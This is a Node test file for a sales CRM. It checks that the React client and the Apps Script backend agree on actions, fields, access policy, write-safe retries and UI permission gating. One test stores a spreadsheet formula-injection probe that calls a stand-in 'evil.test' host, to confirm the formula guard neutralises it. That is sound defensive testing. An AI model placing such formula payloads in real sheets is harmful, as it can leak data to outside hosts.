/**
 * Frontend <-> Apps Script contract.
 *
 * Reads the action strings the React client actually sends out of
 * src/api/services.ts, and checks each one against the deployed router.
 * This is the class of defect that produced `api.users.delete()` calling a
 * `deleteUser` action that never existed on the backend.
 *
 * Run: node --test local/tests/api-contract.test.mjs
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { buildScenario, loginAs, authPost, authGet, ID } from '../harness/scenario.mjs';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');

/** Every fetchAPI('actionName', ...) literal in the client. */
function clientActions() {
  const src = fs.readFileSync(path.join(ROOT, 'src', 'api', 'services.ts'), 'utf8');
  const found = new Set();
  const re = /fetchAPI<?[^>]*>?\(\s*'([A-Za-z0-9_]+)'/g;
  let m;
  while ((m = re.exec(src))) found.add(m[1]);
  return [...found].sort();
}

/** Every action the backend policy table declares. */
function backendActions(be) {
  return Object.keys(be.context.ACTION_POLICY ?? {}).sort();
}

test('CONTRACT-1: every action the client sends exists on the backend', () => {
  const be = buildScenario();
  const client = clientActions();
  const backend = new Set(backendActions(be));

  assert.ok(client.length > 15, `sanity: found ${client.length} client actions`);

  const missing = client.filter((a) => !backend.has(a));
  assert.deepEqual(missing, [], `client calls actions the backend does not implement: ${missing}`);
});

test('CONTRACT-2: every declared action is reachable through the router', () => {
  const be = buildScenario();
  // An unknown action returns UNKNOWN_ACTION; a declared one must not.
  for (const action of backendActions(be)) {
    const res = be.post({ action, payload: {} });
    assert.notEqual(
      res.code, 'UNKNOWN_ACTION',
      `${action} is declared in ACTION_POLICY but not handled in dispatch()`
    );
  }
});

test('CONTRACT-3: no action is left unprotected by policy', () => {
  const be = buildScenario();
  const policy = be.context.ACTION_POLICY;
  for (const [action, rule] of Object.entries(policy)) {
    const isPublic = Boolean(rule.public);
    const hasRoles = Array.isArray(rule.roles) && rule.roles.length > 0;
    assert.ok(
      isPublic || hasRoles,
      `${action} declares neither public:true nor a roles list`
    );
  }
  // Two, and only two, endpoints are reachable without a session.
  //
  // `login` obviously. `recordObservationFetch` because the caller is the
  // observation edge relaying a request from a mail client, which has no CRM
  // session and cannot acquire one — it authenticates with a shared secret
  // instead, and refuses everything when that secret is unset (see
  // PUBLIC-1/PUBLIC-2). Anything else appearing here is a hole.
  assert.deepEqual(
    Object.keys(policy).filter((a) => policy[a].public).sort(),
    ['login', 'recordObservationFetch'],
    'an endpoint became reachable without a session'
  );
});

test('CONTRACT-4: reads return the field names the client maps', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);

  const expectations = {
    getLeads: ['ID', 'Name', 'Email', 'Status', 'OwnerRepId', 'SetterId', 'CloserId', 'Notes', 'Linkedin', 'NextFollowUp'],
    getDeals: ['ID', 'LeadId', 'Value', 'Status', 'OwnerRepId', 'SetterId', 'CloserId'],
    getProjects: ['ID', 'ClientName', 'Status', 'OwnerRepId', 'AccountManagerId', 'LiaisonId', 'StartDate', 'DueDate'],
    getCommissions: ['ID', 'DealId', 'SetterId', 'SetterAmount', 'CloserId', 'CloserAmount', 'PayoutStatus'],
    getAdminRequests: ['ID', 'Type', 'RelatedDealId', 'RequestedBy', 'Status', 'Notes', 'PaymentLink', 'DocumentUrl'],
    getUsers: ['ID', 'Username', 'Role', 'Team', 'Status', 'Availability', 'ZohoEmail', 'ZohoLinked'],
  };

  for (const [action, fields] of Object.entries(expectations)) {
    const res = authGet(be, token, action);
    assert.equal(res.status, 'success', `${action} succeeded`);
    assert.ok(res.data.length > 0, `${action} returned rows to assert on`);
    for (const field of fields) {
      assert.ok(
        Object.prototype.hasOwnProperty.call(res.data[0], field),
        `${action} response is missing "${field}" which the client maps`
      );
    }
  }
});

test('CONTRACT-5: fields the client writes are persisted, not silently dropped', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);

  // AdminRequests.Notes / PaymentLink / DocumentUrl had no columns at all —
  // the client wrote them and they vanished.
  const created = authPost(be, token, 'createAdminRequest', {
    Type: 'payment', RelatedDealId: ID.dealAlphaOpen, Notes: 'Please expedite.',
  });
  assert.equal(created.status, 'success');

  const approved = authPost(be, token, 'approveRequest', {
    requestId: created.data.ID,
    paymentLink: 'https://pay.example.test/inv/1',
  });
  assert.equal(approved.status, 'success');

  const row = be.rows('AdminRequests').find((r) => r.ID === created.data.ID);
  assert.equal(row.Notes, 'Please expedite.', 'Notes persisted');
  assert.equal(row.PaymentLink, 'https://pay.example.test/inv/1', 'PaymentLink persisted');

  // Projects.Notes likewise.
  const proj = authPost(be, token, 'updateProject', { id: ID.projAlpha, Notes: 'Kickoff done.' });
  assert.equal(proj.status, 'success');
  assert.equal(
    be.rows('Projects').find((p) => p.ID === ID.projAlpha).Notes,
    'Kickoff done.'
  );
});

test('CONTRACT-6: the success envelope shape is unchanged from the original API', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);
  const res = authGet(be, token, 'getLeads');

  assert.equal(res.status, 'success');
  assert.ok(Array.isArray(res.data), 'data is still the payload key');
  assert.ok(res.requestId, 'plus a correlation id for tracing');
});

test('CONTRACT-7: GET and POST agree on identity handling', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.repAlpha1);

  // Token via query string (GET) and via body (POST) resolve the same actor.
  const viaGet = authGet(be, token, 'getLeads');
  const viaPostSession = authPost(be, token, 'getSession');

  assert.equal(viaGet.status, 'success');
  assert.equal(viaPostSession.status, 'success');
  assert.equal(viaPostSession.data.user.ID, ID.repAlpha1);
});

test('CONTRACT-8: no endpoint returns a secret field under any role', () => {
  const be = buildScenario();
  be.call('updateRecordRaw', 'Users', ID.repAlpha1, { ZohoRefreshToken: 'CANARY-TOKEN-VALUE' });

  const secretNames = ['PasswordHash', 'PasswordSalt', 'ZohoRefreshToken', 'CANARY-TOKEN-VALUE'];

  for (const userId of [ID.superAdmin, ID.adminAlpha, ID.repAlpha1, ID.setterAlpha]) {
    const token = loginAs(be, userId);
    for (const action of ['getUsers', 'getLeads', 'getDeals', 'getLogs', 'getCommissions']) {
      const res = authGet(be, token, action);
      if (res.status !== 'success') continue;
      const body = JSON.stringify(res.data);
      for (const secret of secretNames) {
        assert.ok(!body.includes(secret), `${action} leaked ${secret} to ${userId}`);
      }
    }
  }
});

test('CONTRACT-9: every editable lead field actually reaches the server', () => {
  // The client maps domain field names onto sheet column names by hand. A
  // missing line there is invisible: the form saves, no error appears, and
  // the value silently never changes. `email` and `phone` were both absent.
  const src = fs.readFileSync(path.join(ROOT, 'src', 'api', 'services.ts'), 'utf8');

  // Anchored on `Partial<Lead>` rather than the whole signature: the point of
  // this test is which fields the mapper carries, and pinning it to one exact
  // line made it fail the moment the signature gained a parameter.
  const start = src.indexOf('payload: Partial<Lead>');
  const end = src.indexOf("await fetchAPI('updateLead'", start);
  assert.ok(start !== -1 && end > start, 'found the lead update mapper');
  const updateBlock = src.slice(start, end);

  const editable = [
    ['name', 'Name'],
    ['email', 'Email'],
    ['phone', 'Phone'],
    ['linkedin', 'Linkedin'],
    ['notes', 'Notes'],
    ['nextFollowUp', 'NextFollowUp'],
    ['status', 'Status'],
  ];

  for (const [domain, column] of editable) {
    assert.ok(
      updateBlock.includes(`payload.${domain}`) && updateBlock.includes(`body.${column}`),
      `updateLead drops "${domain}" - an edit to it would be silently discarded`
    );
  }
});

test('CONTRACT-10: the backend accepts every field the client forwards', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);

  const edits = {
    Name: 'Contract Test Co',
    Email: 'contract@test.example',
    Phone: '+15550001',
    Linkedin: 'https://linkedin.com/company/contract',
    Notes: 'Contract note.',
    NextFollowUp: '2026-03-01',
  };

  const res = authPost(be, token, 'updateLead', { id: ID.leadAlphaNew, ...edits });
  assert.equal(res.status, 'success', res.message);

  // Assert what the API RETURNS, because that is what the UI renders.
  // The stored cell may differ: a value starting with "+" is written with a
  // leading apostrophe so Sheets cannot treat it as a formula.
  const fromApi = authGet(be, token, 'getLeadById', { id: ID.leadAlphaNew }).data;
  for (const [column, value] of Object.entries(edits)) {
    assert.equal(fromApi[column], value, `${column} did not round-trip through the API`);
  }

  // And the guard is still in place underneath.
  const stored = be.rows('Leads').find((l) => l.ID === ID.leadAlphaNew);
  assert.equal(stored.Phone, "'+15550001",
    'the stored phone should keep its formula guard');
});

test('CONTRACT-11: a phone starting with + reads back without an apostrophe', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);

  // Most real phone numbers in this CRM begin with "+971". If the guard
  // apostrophe leaked into responses, every one of them would display wrong.
  const created = authPost(be, token, 'createLead', {
    Name: 'Phone Guard Probe', Phone: '+971 50 219 7200',
  });
  assert.equal(created.status, 'success');

  const list = authGet(be, token, 'getLeads').data;
  const row = list.find((l) => l.ID === created.data.ID);
  assert.equal(row.Phone, '+971 50 219 7200', 'the apostrophe leaked into the API response');

  // A genuine formula is still neutralised in storage.
  const evil = authPost(be, token, 'createLead', {
    Name: 'Formula Probe', Notes: '=IMPORTXML("http://evil.test","//x")',
  });
  const storedEvil = be.rows('Leads').find((l) => l.ID === evil.data.ID);
  assert.ok(String(storedEvil.Notes).startsWith("'="),
    'the formula guard must still apply in the sheet');
});

/* ------------------------------------------------------------------ *
 * Transport safety: retries must never repeat a write
 * ------------------------------------------------------------------ */

test('CONTRACT-12: only reads are retried, so a lost write is never repeated', () => {
  const src = fs.readFileSync(path.join(ROOT, 'src', 'api', 'services.ts'), 'utf8');

  // A response that never arrives does NOT mean the request never ran. Apps
  // Script may well have applied the write and lost the reply, so sending it
  // again would create a second lead, a second commission, a second payout.
  // The retry paths are therefore gated on isSafeToRetry.
  assert.ok(/function isSafeToRetry/.test(src),
    'the retry guard is gone — every failed request would be retried, writes included');

  const guard = src.slice(
    src.indexOf('function isSafeToRetry'),
    src.indexOf('}', src.indexOf('function isSafeToRetry')) + 1
  );
  assert.ok(/\^get/.test(guard) && /'batch'/.test(guard),
    'the guard no longer restricts retries to reads');

  // Every retry call site must be behind the guard.
  const retryCalls = src.split('\n')
    .map((line, i) => ({ line, i }))
    .filter(({ line }) => /return doFetch<T>\(action, method, payload, params, attempt \+ 1\)/.test(line));

  assert.ok(retryCalls.length >= 2, 'expected the network and unreadable-response retries');

  for (const { i } of retryCalls) {
    // Look back a few lines for the guard that admits this retry.
    const before = src.split('\n').slice(Math.max(0, i - 6), i).join('\n');
    assert.ok(/isSafeToRetry\(action\)/.test(before),
      `a retry at line ${i + 1} is not gated by isSafeToRetry — writes could be duplicated`);
  }
});

test('CONTRACT-13: a lost read backs off before retrying, and gives up', () => {
  const src = fs.readFileSync(path.join(ROOT, 'src', 'api', 'services.ts'), 'utf8');

  // The failure this covers was intermittent, landed on a different action
  // each time, and cleared itself when the user navigated away and back —
  // i.e. it was transient, and re-sending is the correct answer. Retrying
  // immediately would just re-enter whatever transient condition caused it,
  // so each attempt waits a little longer than the last.
  assert.ok(/setTimeout\(r, 400 \* \(attempt \+ 1\)\)/.test(src),
    'the backoff before a retry is gone — retries would hammer the backend');

  // Bounded: an endpoint that is genuinely down must surface as an error
  // rather than looping.
  assert.ok(/attempt < 2/.test(src),
    'the retry is no longer bounded — a real outage would retry forever');

  // And the user is told what actually came back, not just "unreadable".
  assert.ok(/exceeded maximum execution time/i.test(src) && /first 400 bytes/.test(src),
    'the diagnostic that classifies a non-JSON response is gone');
});

test('CONTRACT-14: the UI gates deletion, not editing', () => {
  const be = buildScenario();
  const src = fs.readFileSync(
    path.join(ROOT, 'src', 'pages', 'LeadDetail.tsx'), 'utf8');

  // The server decides permissions; the buttons only have to agree with it.
  // They did not: the backend was opened up so anyone working a lead could
  // correct its details, but EDIT LEAD stayed behind `isManager` — so a rep
  // had the right and no way to exercise it.
  const editIdx = src.indexOf('EDIT LEAD');
  const deleteIdx = src.indexOf('<Trash2');
  assert.ok(editIdx !== -1 && deleteIdx !== -1, 'found both buttons');

  // Delete must sit inside an isManager guard; Edit must not.
  const beforeDelete = src.slice(Math.max(0, deleteIdx - 400), deleteIdx);
  assert.match(beforeDelete, /isManager\s*&&/,
    'the DELETE button is no longer restricted to managers');

  const beforeEdit = src.slice(Math.max(0, editIdx - 400), editIdx);
  assert.ok(!/isManager\s*&&\s*\(\s*$/.test(beforeEdit.trimEnd()),
    'EDIT LEAD is gated to managers again, contradicting the server');

  // And the server genuinely permits it, so the button is not a lie.
  const token = loginAs(be, ID.repAlpha1);
  const res = authPost(be, token, 'updateLead', {
    id: ID.leadAlphaNew, Name: 'Rep Corrected This',
  });
  assert.equal(res.status, 'success',
    'the UI offers an edit the server refuses');

  const del = authPost(be, token, 'deleteLead', {
    leadId: ID.leadAlphaNew, reason: 'nope',
  });
  assert.equal(del.code, 'FORBIDDEN', 'deletion escaped the manager check');
});

test('CONTRACT-15: getUsers carries DisplayName, and the client maps it', () => {
  const be = buildScenario();
  be.call('updateRecordRaw', 'Users', ID.repAlpha1, { DisplayName: 'Dolapo Busari' });

  const token = loginAs(be, ID.superAdmin);
  const rows = authGet(be, token, 'getUsers').data;
  const row = rows.find((u) => u.ID === ID.repAlpha1);

  assert.equal(String(row.DisplayName), 'Dolapo Busari',
    'getUsers no longer returns DisplayName');

  // The column existed and was returned for a long time before anything read
  // it, so notifications and team lists showed "dolapo_busari" where a name
  // belonged. A missing line in the mapper is silent: it typechecks, renders,
  // and quietly falls back to the username forever.
  const src = fs.readFileSync(path.join(ROOT, 'src', 'api', 'services.ts'), 'utf8');
  const start = src.indexOf('function toUser');
  const block = src.slice(start, src.indexOf('}', src.indexOf('return {', start)));
  assert.match(block, /displayName:\s*str\(r\.DisplayName\)/,
    'the client drops DisplayName, so every screen shows the login handle');
});
